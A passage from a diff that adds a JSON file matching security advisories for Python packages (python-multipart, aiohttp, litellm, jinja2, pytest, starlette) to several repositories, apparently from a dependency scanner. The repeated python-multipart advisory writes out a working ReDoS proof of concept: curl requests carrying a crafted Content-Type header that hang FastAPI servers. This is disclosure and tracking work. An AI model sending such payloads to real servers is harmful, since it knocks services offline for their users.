!=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:32.513395Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "python-multipart"
+        ],
+        "affected_ranges": [
+          "0..0.0.7",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-24762",
+          "https://github.com/github/advisory-database/pull/4829",
+          "https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4",
+          "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5",
+          "https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc",
+          "https://github.com/Kludex/python-multipart",
+          "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74",
+          "https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml",
+          "https://github.com/tiangolo/fastapi/releases/tag/0.109.1",
+          "https://pypi.org/project/python-multipart",
+          "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'python-multipart' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1850",
+        "source": "osv",
+        "title": "python-multipart vulnerable to Content-Type Header ReDoS",
+        "summary": "### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text/html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])\n\n    start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])\n    return [b\"Ok\"]\n\n\nhttpd = make_server(\"\", 8123, validator(simple_app))\nprint(\"Serving on port 8123...\")\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/'\n```\n\n### Impact\n\nThis is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r\n\n<details>\n<summary>Original report to FastAPI</summary>\n\nHey Tiangolo!\n\nMy name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n```\n\nI'm running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n```\n\nYou'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.\n\nIf you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)\n\n</details>",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:32.513395Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "python-multipart"
+        ],
+        "affected_ranges": [
+          "0..0.0.7",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-24762",
+          "https://github.com/github/advisory-database/pull/4829",
+          "https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4",
+          "https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5",
+          "https://github.com/tiangolo/fastapi/commit/9d34ad0ee8a0dfbbcce06f76c2d5d851085024fc",
+          "https://github.com/Kludex/python-multipart",
+          "https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74",
+          "https://github.com/pypa/advisory-database/tree/main/vulns/fastapi/PYSEC-2024-38.yaml",
+          "https://github.com/tiangolo/fastapi/releases/tag/0.109.1",
+          "https://pypi.org/project/python-multipart",
+          "https://github.com/advisories/GHSA-2jv5-9r88-3w3p"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'python-multipart' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1845",
+        "source": "osv",
+        "title": "pytest has vulnerable tmpdir handling",
+        "summary": "pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:19.758250Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pytest"
+        ],
+        "affected_ranges": [
+          "0..9.0.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-71176",
+          "https://github.com/pytest-dev/pytest/issues/13669",
+          "https://github.com/pytest-dev/pytest/pull/14343",
+          "https://github.com/pytest-dev/pytest/commit/95d8423bd24992deea5b9df32555fa1741679e2c",
+          "https://github.com/pytest-dev/pytes",
+          "https://github.com/pytest-dev/pytest/releases/tag/9.0.3",
+          "https://www.openwall.com/lists/oss-security/2026/01/21/5",
+          "https://pypi.org/project/pytest",
+          "https://github.com/advisories/GHSA-6w46-j5rx-g56g"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pytest' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1845",
+        "source": "osv",
+        "title": "pytest has vulnerable tmpdir handling",
+        "summary": "pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:19.758250Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pytest"
+        ],
+        "affected_ranges": [
+          "0..9.0.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-71176",
+          "https://github.com/pytest-dev/pytest/issues/13669",
+          "https://github.com/pytest-dev/pytest/pull/14343",
+          "https://github.com/pytest-dev/pytest/commit/95d8423bd24992deea5b9df32555fa1741679e2c",
+          "https://github.com/pytest-dev/pytes",
+          "https://github.com/pytest-dev/pytest/releases/tag/9.0.3",
+          "https://www.openwall.com/lists/oss-security/2026/01/21/5",
+          "https://pypi.org/project/pytest",
+          "https://github.com/advisories/GHSA-6w46-j5rx-g56g"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pytest' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1845",
+        "source": "osv",
+        "title": "pytest has vulnerable tmpdir handling",
+        "summary": "pytest through 9.0.2 on UNIX relies on directories with the `/tmp/pytest-of-{user}` name pattern, which allows local users to cause a denial of service or possibly gain privileges.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:19.758250Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "pytest"
+        ],
+        "affected_ranges": [
+          "0..9.0.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-71176",
+          "https://github.com/pytest-dev/pytest/issues/13669",
+          "https://github.com/pytest-dev/pytest/pull/14343",
+          "https://github.com/pytest-dev/pytest/commit/95d8423bd24992deea5b9df32555fa1741679e2c",
+          "https://github.com/pytest-dev/pytes",
+          "https://github.com/pytest-dev/pytest/releases/tag/9.0.3",
+          "https://www.openwall.com/lists/oss-security/2026/01/21/5",
+          "https://pypi.org/project/pytest",
+          "https://github.com/advisories/GHSA-6w46-j5rx-g56g"
+        ]
+      },
+      "repo": "ianlintner/python_dsa",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'pytest' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1471",
+        "source": "osv",
+        "title": "Jinja2 vulnerable to sandbox breakout through attr filter selecting format method",
+        "summary": "An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:50.446969Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "jinja2"
+        ],
+        "affected_ranges": [
+          "0..3.1.6",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/pallets/jinja/security/advisories/GHSA-cpwx-vrp4-4pq7",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-27516",
+          "https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403",
+          "https://github.com/pallets/jinja",
+          "https://lists.debian.org/debian-lts-announce/2025/04/msg00022.html",
+          "https://lists.debian.org/debian-lts-announce/2025/04/msg00045.html",
+          "https://pypi.org/project/jinja2",
+          "https://github.com/advisories/GHSA-cpwx-vrp4-4pq7"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'jinja2' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1618",
+        "source": "osv",
+        "title": "MCP Python SDK has Unhandled Exception in Streamable HTTP Transport, Leading to Denial of Service",
+        "summary": "If a client deliberately triggers an exception after establishing a streamable HTTP session, this can lead to an uncaught ClosedResourceError on the server side, causing the server to crash and requiring a restart to restore service. Impact may vary depending on the deployment conditions, and presence of infrastructure-level resilience measures.\n\nThank you to Rich Harang for reporting this issue.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:02:56.105116Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "mcp"
+        ],
+        "affected_ranges": [
+          "0..1.10.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-j975-95f5-7wqh",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-53365",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/967",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/7b420656de48cfdb90b39eb582e60b6d55c2f891",
+          "https://github.com/modelcontextprotocol/python-sdk",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.10.0",
+          "https://pypi.org/project/mcp",
+          "https://github.com/advisories/GHSA-j975-95f5-7wqh"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'mcp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1107",
+        "source": "osv",
+        "title": "AIOHTTP vulnerable to DoS when bypassing asserts",
+        "summary": "### Summary\nWhen assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.\n\n### Impact\nIf optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.\n\n------\n\nPatch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:15.809963Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jj3x-wxrx-4x23",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69227",
+          "https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-jj3x-wxrx-4x23"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1551",
+        "source": "osv",
+        "title": "litellm vulnerable to improper access control in team management",
+        "summary": "berriai/litellm version 1.34.34 is vulnerable to improper access control in its team management functionality. This vulnerability allows attackers to perform unauthorized actions such as creating, updating, viewing, deleting, blocking, and unblocking any teams, as well as adding or deleting any member to or from any teams. The vulnerability stems from insufficient access control checks in various team management endpoints, enabling attackers to exploit these functionalities without proper authorization.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:35.921148Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.40.15",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-5710",
+          "https://github.com/BerriAI/litellm/commit/da3ae00bd68f451ed8ddf0bc0a9fd34bde5554d6",
+          "https://github.com/BerriAI/litellm/blob/224148d6133ee50801cb129cbd21ccc213992e25/litellm/proxy/auth/user_api_key_auth.py#L1020",
+          "https://github.com/berriai/litellm",
+          "https://huntr.com/bounties/70897f59-a966-4d93-b71e-745e3da91970",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-qqcv-vg9f-5rr3"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1941",
+        "source": "osv",
+        "title": "Starlette has possible denial-of-service vector when parsing large files in multipart forms",
+        "summary": "### Summary\nWhen parsing a multi-part form with large files (greater than the [default max spool size](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/formparsers.py#L126)) `starlette` will block the main thread to roll the file over to disk. This blocks the event thread which means we can't accept new connections.\n\n### Details\nPlease see this discussion for details: https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403. In summary the following UploadFile code (copied from [here](https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14)) has a minor bug. Instead of just checking for `self._in_memory` we should also check if the additional bytes will cause a rollover.\n\n```python\n\n    @property\n    def _in_memory(self) -> bool:\n        # check for SpooledTemporaryFile._rolled\n        rolled_to_disk = getattr(self.file, \"_rolled\", True)\n        return not rolled_to_disk\n\n    async def write(self, data: bytes) -> None:\n        if self.size is not None:\n            self.size += len(data)\n\n        if self._in_memory:\n            self.file.write(data)\n        else:\n            await run_in_threadpool(self.file.write, data)\n```\n\nI have already created a PR which fixes the problem: https://github.com/encode/starlette/pull/2962\n\n\n### PoC\nSee the discussion [here](https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403) for steps on how to reproduce.\n\n### Impact\nTo be honest, very low and not many users will be impacted. Parsing large forms is already CPU intensive so the additional IO block doesn't slow down `starlette` that much on systems with modern HDDs/SSDs. If someone is running on tape they might see a greater impact.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:02:58.086064Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "starlette"
+        ],
+        "affected_ranges": [
+          "0..0.47.2",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/encode/starlette/security/advisories/GHSA-2c2j-9gv5-cj73",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-54121",
+          "https://github.com/encode/starlette/commit/9f7ec2eb512fcc3fe90b43cb9dd9e1d08696bec1",
+          "https://github.com/encode/starlette",
+          "https://github.com/encode/starlette/blob/fa5355442753f794965ae1af0f87f9fec1b9a3de/starlette/datastructures.py#L436C5-L447C14",
+          "https://github.com/encode/starlette/discussions/2927#discussioncomment-13721403",
+          "https://pypi.org/project/starlette",
+          "https://github.com/advisories/GHSA-2c2j-9gv5-cj73"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'starlette' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1099",
+        "source": "osv",
+        "title": "AIOHTTP's unicode processing of header values could cause parsing discrepancies",
+        "summary": "### Summary\nThe Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.\n\n### Impact\nIf a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.\n\n------\n\nPatch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:15.238774Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-69f9-5gxw-wvc2",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69224",
+          "https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-69f9-5gxw-wvc2"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1542",
+        "source": "osv",
+        "title": "litellm passes untrusted data to `eval` function without sanitization",
+        "summary": "A remote code execution (RCE) vulnerability exists in the berriai/litellm project due to improper control of the generation of code when using the `eval` function unsafely in the `litellm.get_secret()` method. Specifically, when the server utilizes Google KMS, untrusted data is passed to the `eval` function without any sanitization. Attackers can exploit this vulnerability by injecting malicious values into environment variables through the `/config/update` endpoint, which allows for the update of settings in `proxy_server_config.yaml`.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:42.739863Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-4264",
+          "https://github.com/BerriAI/litellm",
+          "https://github.com/BerriAI/litellm/blob/main/litellm/proxy/proxy_server.py#L2104-L2108",
+          "https://github.com/BerriAI/litellm/blob/main/litellm/proxy/proxy_server.py#L2118",
+          "https://github.com/BerriAI/litellm/blob/main/litellm/proxy/proxy_server.py#L2509-L2517",
+          "https://github.com/BerriAI/litellm/blob/main/litellm/proxy/proxy_server.py#L2562-L2577",
+          "https://github.com/BerriAI/litellm/blob/main/litellm/utils.py#L9867-L9885",
+          "https://huntr.com/bounties/a3221b0c-6e25-4295-ab0f-042997e8fc61",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-7ggm-4rjg-594w"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1100",
+        "source": "osv",
+        "title": "AIOHTTP vulnerable to  denial of service through large payloads",
+        "summary": "### Summary\nA request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.\n\n### Impact\nIf an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:16.152840Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.13.3",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-6jhg-hg63-jvvf",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-69228",
+          "https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-6jhg-hg63-jvvf"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1102",
+        "source": "osv",
+        "title": "aiohttp Cross-site Scripting vulnerability on index pages for static file handling",
+        "summary": "### Summary\n\nA XSS vulnerability exists on index pages for static file handling.\n\n### Details\n\nWhen using `web.static(..., show_index=True)`, the resulting index pages do not escape file names.\n\nIf users can upload files with arbitrary filenames to the static directory, the server is vulnerable to XSS attacks.\n\n### Workaround\n\nWe have always recommended using a reverse proxy server (e.g. nginx) for serving static files. Users following the recommendation are unaffected.\n\nOther users can disable `show_index` if unable to upgrade.\n\n-----\n\nPatch: https://github.com/aio-libs/aiohttp/pull/8319/files",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:39.766336Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.9.4",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-7gpw-8wmc-pm8g",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-27306",
+          "https://github.com/aio-libs/aiohttp/pull/8319",
+          "https://github.com/aio-libs/aiohttp/pull/8319/files",
+          "https://github.com/aio-libs/aiohttp/commit/28335525d1eac015a7e7584137678cbb6ff19397",
+          "https://github.com/aio-libs/aiohttp",
+          "https://lists.debian.org/debian-lts-announce/2025/02/msg00002.html",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2EXRGTN2WG7VZLUZ7WOXU5GQJKCPPHKP",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NWEI6NIHZ3G7DURDZVMRK7ZEFC2BTD3U",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZIVBMPEY7WWOFMC3CWXFBRQPFECV4SW3",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-7gpw-8wmc-pm8g"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1106",
+        "source": "osv",
